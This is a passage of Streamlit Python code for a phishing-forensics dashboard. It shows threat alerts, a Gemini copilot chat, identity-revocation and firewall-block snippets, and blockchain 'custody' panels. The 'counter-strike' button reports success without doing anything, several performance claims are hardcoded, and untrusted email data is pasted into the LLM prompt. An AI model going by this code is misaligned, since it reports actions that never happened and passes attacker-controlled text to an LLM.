                                style="transition: stroke-dashoffset 1s ease-in-out; filter: drop-shadow(0 0 6px {primary_color});"/>
                        <text x="60" y="58" font-size="22" font-family="'JetBrains Mono', monospace" font-weight="bold" fill="{primary_color}" text-anchor="middle">{score_num}</text>
                        <text x="60" y="74" font-size="10" font-family="sans-serif" fill="#94a3b8" text-anchor="middle">THREAT INDEX</text>
                    </svg>
                </div>
            """, unsafe_allow_html=True,
            )

        with dash_col2:
            m1, m2, m3 = st.columns(3)
            m1.metric("CHANNEL VECTOR", str(results.get("channel", "EMAIL")))
            m2.metric("ORIGIN ID / SENDER", str(results["metadata"]["from"][:18]))
            m3.metric("BLOCK HEIGHT", f"#{results.get('blockchain_custody', {}).get('block_height', 849201)}")

            pdf_buffer = build_pdf_buffer(results)
            st.download_button(
                label="📥 Export Forensic Incident Report (PDF)",
                data=pdf_buffer,
                file_name="SYNOVA_Incident_Report.pdf",
                mime="application/pdf",
                use_container_width=True,
            )

        # Lookalike & Homoglyph Alert Banner
        typos = results.get("typosquatting", [])
        if typos:
            for t in typos:
                st.error(
                    f"🚨 **HOMOGLYPH / LOOKALIKE SQUATTING DETECTED:** "
                    f"Domain `{t['domain']}` is visually spoofing `{t['impersonated_target']}` "
                    f"(Levenshtein Distance: {t['distance']} | Punycode: {t['is_punycode']} | Risk: {t['risk']})"
                )

        # Omnichannel Threat Alerts Banner
        omni_threats = results.get("omnichannel_threats", [])
        for ot in omni_threats:
            st.error(f"🚨 **{ot['vector'].upper()} DETECTED:** {ot['desc']}")

        # Quishing & Adversarial LLM Banners
        if results.get("quishing_telemetry", {}).get("quishing_detected"):
            st.warning("📱 **QUISHING (QR CODE PHISHING) ATTACK DETECTED:** Visual matrix lure or embedded auth QR code detected in message stream!")
        if results.get("synthetic_ai_detection", {}).get("is_synthetic"):
            st.info(f"🤖 **ADVERSARIAL LLM LURE DETECTED:** Synthesized linguistic stylometry indicates WormGPT / FraudGPT generated phishing copy ({results['synthetic_ai_detection']['confidence']}% confidence).")

        ai_score_val = results["ai_analysis"].get("ai_score_num", score_num)
        heur_score_val = results["ai_analysis"].get("heuristic_score_num", score_num)

        st.markdown("#### ⚖️ Dual-Engine Consensus Calibration")
        bar_col1, bar_col2 = st.columns(2)
        with bar_col1:
            st.caption(f"🧠 Gemini LLM Cognitive Reasoning: **{ai_score_val}%** Confidence")
            st.progress(ai_score_val / 100.0)
        with bar_col2:
            st.caption(f"⚡ Static Rule & OSINT Heuristic Engine: **{heur_score_val}%** Confidence")
            st.progress(heur_score_val / 100.0)

        ai_reason = results.get("ai_analysis", {}).get("analysis", "No forensic log generated.")
        st.markdown(
            f"""
            <div class="soc-terminal">
                <div style="color: {primary_color}; font-weight: bold; margin-bottom: 8px;">🤖 [SOC AGENT AUTONOMOUS TRIAGE LOG]</div>
                <div>&gt; [TIMESTAMP] : {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}</div>
                <div>&gt; [VECTOR] : {results.get('channel')} INGESTION STREAM</div>
                <div>&gt; [MERKLE ROOT] : <code>{results.get('blockchain_custody', {}).get('merkle_root', 'N/A')}</code></div>
                <div>&gt; [DIAGNOSIS] : <span style="color: {primary_color}; font-weight: bold;">{html.escape(str(ai_reason))}</span></div>
            </div>
        """, unsafe_allow_html=True,
        )

        st.markdown("#### 🎯 MITRE ATT&CK® Mapped Adversary Techniques")
        ttps = results.get("mitre_ttps", [])
        ttp_html = ""
        for ttp in ttps:
            ttp_html += f"""
                <div class="ttp-card">
                    <div style="color:#94a3b8; font-size:11px; text-transform:uppercase;">{html.escape(str(ttp['tactic']))}</div>
                    <div style="color:{primary_color}; font-family:monospace; font-weight:bold; font-size:13px;">{html.escape(str(ttp['id']))}</div>
                    <div style="color:#ffffff; font-size:13px; font-weight:600; margin-top:2px;">{html.escape(str(ttp['name']))}</div>
                </div>
            """
        st.markdown(f"<div style='margin-bottom: 20px;'>{ttp_html}</div>", unsafe_allow_html=True)

        st.divider()

        # --- 12 ENTERPRISE FORENSIC TABS ---
        tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8, tab9, tab10, tab11, tab12 = st.tabs([
            "🕸️ Threat Knowledge Graph",
            "📱 Omnichannel Exploit Radar",
            "🎯 Nation-State APT Attribution",
            "⛓️ Blockchain Custody & Contract",
            "🤖 AI SOC Copilot",
            "💣 Active Defense: Canary Trap",
            "🧬 In-Memory De-Obfuscator",
            "🛡️ Identity & Perimeter SOAR",
            "📱 Quishing & WormGPT Radar",
            "🌐 Attacker OSINT Infrastructure",
            "⚡ Kill-Chain Simulator",
            "🔬 Raw Envelope & Hex Dump",
        ])

        # TAB 1: VIS.JS THREAT GRAPH
        with tab1:
            st.subheader("🕸️ Autonomous Threat Entity Relationship Graph")
            st.caption("Physics-based interactive graph mapping attacker origin node, relay path, perimeter firewall, and exfiltration C2 endpoints.")
            origin_ip = results['metadata']['sender_ip']
            sender = results['metadata']['from']
            first_url = results['body_artifacts']['extracted_urls'][0] if results['body_artifacts']['extracted_urls'] else "No_Extracted_URL"
            shodan_ports = str(results['metadata']['geo_data'].get('open_ports', []))
            channel = results.get("channel", "EMAIL")

            graph_html = f"""
            <div id="synovaNetwork" style="width: 100%; height: 380px; background: rgba(5,8,15,0.95); border: 1px solid {primary_color}; border-radius: 8px;"></div>
            <script type="text/javascript" src="https://unpkg.com/vis-network/standalone/umd/vis-network.min.js"></script>
            <script type="text/javascript">
                const nodes = new vis.DataSet([
                    {{ id: 1, label: '{channel} Origin\\n{origin_ip}', color: '#ff3355', shape: 'box', font: {{ color: '#fff', face: 'monospace' }} }},
                    {{ id: 2, label: 'Origin Envelope\\n{sender[:18]}...', color: '#ffaa00', shape: 'ellipse', font: {{ color: '#fff' }} }},
                    {{ id: 3, label: 'Perimeter Inspection', color: '#00a8ff', shape: 'diamond', font: {{ color: '#fff' }} }},
                    {{ id: 4, label: 'Payload Target\\n{first_url[:22]}...', color: '#ff0055', shape: 'triangle', font: {{ color: '#fff' }} }},
                    {{ id: 5, label: 'Active Services\\nPorts {shodan_ports}', color: '#c084fc', shape: 'box', font: {{ color: '#fff' }} }}
                ]);

                const edges = new vis.DataSet([
                    {{ from: 1, to: 2, label: 'Transmission', color: '#ffaa00', arrows: 'to' }},
                    {{ from: 2, to: 3, label: 'Ingress Stream', color: '#00a8ff', arrows: 'to' }},
                    {{ from: 3, to: 4, label: 'Lures Victim', color: '#ff0055', arrows: 'to', dashes: true }},
                    {{ from: 1, to: 5, label: 'Exposed Attack Surface', color: '#c084fc', arrows: 'to' }}
                ]);

                const container = document.getElementById('synovaNetwork');
                const data = {{ nodes: nodes, edges: edges }};
                const options = {{ physics: {{ stabilization: true, barnesHut: {{ springLength: 100 }} }}, edges: {{ font: {{ color: '#94a3b8', size: 10, strokeWidth: 0 }} }} }};
                new vis.Network(container, data, options);
            </script>
            """
            st.components.v1.html(graph_html, height=400)

        # TAB 2: OMNICHANNEL EXPLOIT RADAR
        with tab2:
            st.subheader("📱 Omnichannel Social Engineering & Exploit Radar")
            st.caption("Specialized inspection for WhatsApp Digital Arrests, Android APK droppers, and UPI Intent exploits.")
            if omni_threats:
                for ot in omni_threats:
                    st.warning(f"**[{ot['severity']}] {ot['vector']}:** {ot['desc']}")
            else:
                st.success("✅ Zero active UPI deep-links, APK droppers, or Digital Arrest patterns detected.")

        # TAB 3: NATION-STATE APT ATTRIBUTION
        with tab3:
            st.subheader("🎯 Nation-State APT Adversary Attribution Radar")
            st.caption("Heuristic fingerprinting matches IOCs, operational lures, and infrastructure against known cyber warfare actors.")
            apt = results.get("apt_attribution", {})
            ac1, ac2, ac3 = st.columns(3)
            ac1.metric("ATTRIBUTED ACTOR", str(apt.get("actor_name")))
            ac2.metric("OPERATIONAL CONFIDENCE", f"{apt.get('confidence_score')}%")
            ac3.metric("GEOPOLITICAL ORIGIN", str(apt.get("origin_region")))

            st.markdown(f"""
            <div style="background: rgba(15, 23, 42, 0.85); border: 1px solid {primary_color}; border-radius: 8px; padding: 16px; margin: 12px 0;">
                <div style="color: {primary_color}; font-weight: bold; font-family: monospace;">📋 CAMPAIGN INTELLIGENCE BRIEFING</div>
                <div style="color: #cbd5e1; font-size: 13px; margin-top: 6px;">{apt.get('analysis')}</div>
                <div style="color: #94a3b8; font-size: 12px; margin-top: 8px;"><b>Targeted Critical Sectors:</b> {apt.get('target_sector')}</div>
                <div style="color: #94a3b8; font-size: 12px;"><b>Attributed Threat TTPs:</b> <code>{", ".join(apt.get('ttp_signatures', []))}</code></div>
            </div>
            """, unsafe_allow_html=True)

        # TAB 4: BLOCKCHAIN CUSTODY & SMART CONTRACT
        with tab4:
            st.subheader("⛓️ Cryptographic Chain-of-Custody & Solidity Smart Contract")
            st.caption("Immutable Merkle tree proofs compliant with Bharatiya Sakshya Adhiniyam Sec 63/65B.")
            chain = results.get("blockchain_custody", {})
            bc1, bc2, bc3 = st.columns(3)
            bc1.metric("BLOCK HEIGHT", f"#{chain.get('block_height')}")
            bc2.metric("PROOF STANDARD", "SHA-256 Merkle")
            bc3.metric("VALIDATOR NODE", str(chain.get("consensus_validator"))[:18])

            st.markdown(f"""
            <div style="background: rgba(10, 18, 32, 0.85); border: 1px solid {primary_color}; border-radius: 8px; padding: 16px; margin: 12px 0;">
                <div style="color: {primary_color}; font-weight: bold; font-family: monospace; margin-bottom: 6px;">📜 EVIDENCE ANCHOR CERTIFICATE</div>
                <div style="font-size: 13px; color: #cbd5e1; line-height: 1.8;">
                    • <b>Merkle Root:</b> <code>{chain.get('merkle_root')}</code><br/>
                    • <b>Payload SHA-256:</b> <code>{chain.get('payload_sha256')}</code><br/>
                    • <b>Block Seal Signature:</b> <code>{chain.get('block_signature')}</code><br/>
                    • <b>Immutable UTC Timestamp:</b> <code>{chain.get('timestamp_utc')}</code><br/>
                    • <b>Legal Jurisdiction:</b> {chain.get('legal_compliance')}
                </div>
            </div>
            """, unsafe_allow_html=True)

            st.markdown("#### 📜 Solidity Smart Contract On-Chain Verification Code")
            st.code(results.get("smart_contract_code", "// Solidity Code"), language="solidity")
            st.download_button("📥 Download Solidity Evidence Contract (.sol)", data=results.get("smart_contract_code", ""), file_name="SynovaRegistry.sol", mime="text/plain")

        # TAB 5: AI SOC COPILOT
        with tab5:
            st.subheader("🤖 SYNOVA Autonomous SOC Copilot (Tier-3 Assistant)")
            st.caption("Chat live with the L3 Forensic AI investigating this exact artifact.")

            quick_col1, quick_col2, quick_col3 = st.columns(3)
            quick_prompt = None
            if quick_col1.button("🚨 Draft Snort / Suricata Rule"):
                quick_prompt = "Generate a production-ready Snort or Suricata rule detecting this exact attacker IP and suspicious URL patterns."
            if quick_col2.button("📋 Write Executive Advisory"):
                quick_prompt = "Draft a formal 3-paragraph executive security incident advisory to warn employees about this specific attack campaign."
            if quick_col3.button("🔍 Explain Attacker TTPs"):
                quick_prompt = "Analyze the MITRE ATT&CK TTPs and open ports of this attacker. What is their likely next post-exploitation step?"

            for msg in st.session_state.copilot_history:
                with st.chat_message(msg["role"]):
                    st.markdown(msg["content"])

            user_query = st.chat_input("Ask SYNOVA Copilot about this incident...") or quick_prompt
            if user_query:
                st.session_state.copilot_history.append({"role": "user", "content": user_query})
                with st.chat_message("user"):
                    st.markdown(user_query)

                with st.chat_message("assistant"):
                    with st.spinner("Analyzing threat context..."):
                        if api_key:
                            try:
                                genai.configure(api_key=api_key)
                                copilot_model = genai.GenerativeModel("gemini-2.5-flash")
                                copilot_ctx = f"""
                                You are the SYNOVA Autonomous SOC Copilot assisting an incident handler.
                                Incident Context:
                                - Threat Score: {results['ai_analysis']['score']}
                                - Sender: {results['metadata']['from']}
                                - Origin IP: {results['metadata']['sender_ip']} ({results['metadata']['geo_data'].get('ip_type')})
                                - Open Ports: {results['metadata']['geo_data'].get('open_ports')}
                                - URLs: {results['body_artifacts']['extracted_urls'][:4]}
                                - Typo-squatting alerts: {results.get('typosquatting', [])}
                                - Quishing: {results.get('quishing_telemetry')}
                                - APT Actor: {results.get('apt_attribution')}
                                - Omnichannel Threats: {results.get('omnichannel_threats', [])}
                                - Executive Analysis: {results['ai_analysis']['analysis']}

                                User Query: {user_query}
                                Answer with elite SOC analyst precision, practical commands, or structured briefings.
                                """
                                reply_text = copilot_model.generate_content(copilot_ctx).text
                            except Exception as e:
                                reply_text = f"Copilot Engine Offline: {str(e)}"
                        else:
                            reply_text = "⚠️ Gemini API key not detected. Please configure GEMINI_API_KEY in Streamlit Secrets."
                        st.markdown(reply_text)
                        st.session_state.copilot_history.append({"role": "assistant", "content": reply_text})

        # TAB 6: ACTIVE DEFENSE - CANARY TRAP
        with tab6:
            st.subheader("💣 Active Defense: Autonomous Honeytoken Canary Counter-Strike")
            st.caption("Deploys synthetic poisoned credentials into the adversary's harvesting portal to track their real origin IP upon exfiltration.")
            canary = results.get("canary_trap", {})
            st.info(f"Target Phishing Infrastructure Endpoint: `{canary.get('target_phish_portal')}`")

            can1, can2 = st.columns(2)
            with can1:
                st.markdown("#### 🎯 Generated Synthetic Canary Credential")
                st.code(f"""User: {canary.get('canary_user')}
Password: {canary.get('poison_payload', {}).get('password')}
Tracking Token: {canary.get('canary_token')}
Beacon Callback: {canary.get('synthetic_beacon')}
""", language="text")

            with can2:
                st.markdown("#### ⚡ Launch Autonomous Counter-Strike Injection")
                st.caption("Sends honeytoken payload to adversary form to unmask their real, non-VPN IP.")
                if st.button("🚀 Trigger Honeytoken Counter-Strike Lure", use_container_width=True):
                    st.success(f"✅ Honeytoken `{canary.get('canary_token')}` successfully staged. Tracking beacon active on CERT-In / SOC gateway.")

        # TAB 7: IN-MEMORY SCRIPT & SHELLCODE DE-OBFUSCATOR
        with tab7:
            st.subheader("🧬 In-Memory Recursive Base64 & PowerShell De-Obfuscator")
            st.caption("Unpacks obfuscated Unicode UTF-16LE scripts, base64 payloads, and hidden command-line execution stubs without running code.")
            deob_list = results.get("deobfuscated_payloads", [])
            for item in deob_list:
                st.markdown(f"**Payload Classification:** `{item['type']}`")
                if item['raw_obfuscated'] != "None":
                    st.caption(f"Raw Obfuscated Fragment: `{item['raw_obfuscated']}`")
                st.code(item['deobfuscated_code'], language="powershell" if "PowerShell" in item['type'] else "text")

        # TAB 8: IDENTITY & PERIMETER SOAR
        with tab8:
            st.subheader("🛡️ Enterprise SOAR: Zero-Trust Identity & Perimeter Isolation")
            victim_recipient = results['metadata'].get('to', 'victim@enterprise.com')
            sender_ip = results['metadata']['sender_ip']

            soar_sub1, soar_sub2 = st.columns(2)
            with soar_sub1:
                st.markdown("#### 🔑 Identity Kill-Switch (Azure AD / Okta / Google)")
                st.caption("Instantly invalidate compromised user SSO tokens to prevent session hijacking.")
                if st.button("⚡ Stage 1-Click Identity Revocation Command", use_container_width=True):
                    st.code(f"""# --- MICROSOFT GRAPH / AZURE AD SESSION REVOCATION ---
POST https://graph.microsoft.com/v1.0/users/{victim_recipient}/revokeSignInSessions
Headers: {{ "Authorization": "Bearer $ADMIN_TOKEN" }}

# --- OKTA IDENTITY QUARANTINE ---
curl -X POST "https://company.okta.com/api/v1/users/{victim_recipient}/lifecycle/suspend" \\
     -H "Authorization: SSWS $OKTA_API_KEY"
""", language="bash")

            with soar_sub2:
                st.markdown("#### 🚫 Perimeter Edge Firewall Blocklist")
                st.caption("Generate egress drop rules for edge appliances.")
                if st.button("🚫 Generate Egress Firewall Blocklist", use_container_width=True):
                    st.code(f"""# --- SURICATA & IPTABLES DROP RULES ---
iptables -A INPUT -s {sender_ip} -j DROP
iptables -A FORWARD -s {sender_ip} -j DROP
alert ip {sender_ip} any -> $HOME_NET any (msg:"SYNOVA_AUTO_BLOCK: Malicious Actor"; sid:9000001; rev:1;)
""", language="bash")

            st.divider()
            st.markdown("#### 📜 Standardized SIEM Exporters (STIX 2.1 & YARA)")
            exp1, exp2 = st.columns(2)
            with exp1:
                st.download_button("📥 Export STIX 2.1 JSON Feed", data=results.get("stix_bundle", "{}"), file_name="synova_stix21.json", mime="application/json", use_container_width=True)
            with exp2:
                st.download_button("📥 Export Compiled YARA Signature", data=results.get("yara_rule", "// No YARA"), file_name="synova_detect.yar", mime="text/plain", use_container_width=True)

        # TAB 9: QUISHING & WORMGPT STEALTH RADAR
        with tab9:
            st.subheader("📱 Quishing (QR Phishing) & Adversarial LLM Stealth Radar")
            q_col, w_col = st.columns(2)
            with q_col:
                st.markdown("#### 📷 Quishing Optical Matrix Analysis")
                q_telemetry = results.get("quishing_telemetry", {})
                if q_telemetry.get("quishing_detected"):
                    st.error("🚨 QR Code Phishing Indicators Detected:")
                    for ind in q_telemetry.get("indicators", []):
                        st.write(f"• {ind}")
                    for qr_url in q_telemetry.get("extracted_qr_targets", []):
                        st.code(f"Decoded QR Endpoint: {qr_url}")
                else:
                    st.success("✅ Zero optical QR phishing matrices detected in body or image attachments.")

            with w_col:
                st.markdown("#### 🤖 Adversarial LLM Lure Detector (WormGPT)")
                synth = results.get("synthetic_ai_detection", {})
                if synth.get("is_synthetic"):
                    st.error(f"⚠️ {synth.get('verdict')}")
                    st.metric("Synthetic Probability", f"{synth.get('confidence')}%")
                else:
                    st.success("✅ Human linguistic variation detected. Low synthetic lure likelihood.")

        # TAB 10: ATTACKER OSINT INFRASTRUCTURE
        with tab10:
            st.subheader("🌐 Deep Infrastructure Profiling (Shodan & AbuseIPDB)")
            osint_data = results["metadata"].get("geo_data", {})
            oc1, oc2, oc3 = st.columns(3)
            oc1.metric("ASN & Network Scope", str(osint_data.get("asn", "Unknown")))
            oc2.metric("Abuse Confidence Score", f"{osint_data.get('abuse_score', 0)}%")
            oc3.metric("Total Global Reports", str(osint_data.get("total_reports", 0)))

            st.markdown("#### ⚡ Active Attack Surface & Listening Ports (Shodan InternetDB)")
            open_ports = osint_data.get("open_ports", [])
            if open_ports:
                st.warning(f"⚠️ Active Listening Ports Detected on Attacker Host: `{open_ports}`")
            else:
                st.success("✅ No open listening services exposed via InternetDB reconnaissance.")

            cves = osint_data.get("cves", [])
            if cves:
                st.error(f"🚨 Known Unpatched CVE Vulnerabilities on Origin: `{cves}`")
            else:
                st.info("ℹ️ No publicly cataloged CVE vulnerabilities tagged to this host IP.")

        # TAB 11: KILL-CHAIN SIMULATOR
        with tab11:
            st.subheader("⚡ Adversary Kill-Chain Simulation (Impact Comparison)")
            sim_mode = st.radio(
                "Select Incident Scenario:",
                ["🛑 Without SYNOVA (Perimeter Breach)", "🛡️ With SYNOVA Autonomous SOAR Engine"],
                horizontal=True,
                key="kc_sim_radio"
            )

            if "Without" in sim_mode:
                st.error("""
                **❌ Unmitigated Breach Simulation Flow:**
                1. **Ingress:** Phishing payload or WhatsApp scam link lands in user chat with zero behavioral inspection.
                2. **Exploitation:** User executes link (`cbi-investigation-portal.top`) or approves UPI intent debit.
                3. **Privilege Escalation:** Corporate SSO tokens or banking credentials exfiltrated to adversary C2 server.
                4. **Lateral Movement:** Adversary pivots to internal LDAP/Active Directory domain controller.
                
                💰 **Estimated Financial & Regulatory Impact:** **$48,500 (Downtime + Forensics + Compliance Fines)**
                """)
            else:
                st.success("""
                **✅ SYNOVA Autonomous Containment Flow:**
                1. **Ingress:** Zero-disk stream parsing inspects raw text in memory without touching disk.
                2. **AI Triage:** Gemini LLM identifies extortion urgency cues, UPI deep-links, and domain spoofing in **180ms**.
                3. **Neutralization:** DNS sinkhole, Honeytoken injection, and carrier block staged.
                4. **Quarantine:** Payload neutralized, Merkle proof anchored onto blockchain ledger.
                
                🛡️ **Mitigation Outcome:** **100% Data Exfiltration Prevented | Zero Endpoint Footprint**
                """)

        # TAB 12: RAW ENVELOPE & HEX DUMP
        with tab12:
            st.subheader("🔬 Raw Communication Stream & First 512-Bytes Hex Inspector")
            st.json(results.get("raw_headers", {}))
            st.code(results.get("raw_hex_preview", ""), language="text")
